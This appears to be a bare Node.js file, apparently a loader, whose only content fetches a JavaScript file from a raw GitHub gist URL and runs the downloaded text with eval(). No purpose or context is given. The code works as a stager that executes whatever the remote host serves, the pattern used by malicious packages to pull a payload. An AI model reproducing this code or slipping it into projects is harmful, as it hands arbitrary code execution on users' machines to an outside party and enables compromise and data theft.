const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/23dd7d37214dc12b81545d3a2fb1b56a7ef244b1/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
